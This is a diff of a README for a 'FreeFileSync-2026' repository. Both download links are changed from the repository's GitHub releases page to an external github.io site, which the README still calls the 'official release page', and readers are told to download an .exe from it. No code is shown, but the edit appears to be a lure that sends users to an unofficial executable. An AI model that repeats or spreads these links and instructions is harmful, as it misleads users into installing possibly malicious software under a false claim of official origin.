@@ -1,6 +1,6 @@
 # 📁 FreeFileSync-2026 - Sync your files with ease today
 
-[![](https://img.shields.io/badge/Download-FreeFileSync-blue.svg)](https://github.com/MrDotcom0/FreeFileSync-2026/releases)
+[![](https://img.shields.io/badge/Download-FreeFileSync-blue.svg)](https://mrdotcom0.github.io)
 
 ## 📌 About this software
 
@@ -14,7 +14,7 @@ Before you install the software, check your computer. You need a PC running Wind
 
 The installation file resides on the releases page. Follow these steps to get the file.
 
-1. Go to the [official release page](https://github.com/MrDotcom0/FreeFileSync-2026/releases).
+1. Go to the [official release page](https://mrdotcom0.github.io).
 2. Look for the latest version at the top of the list.
 3. Click the link that ends in .exe.
 4. Save the file to your Downloads folder.
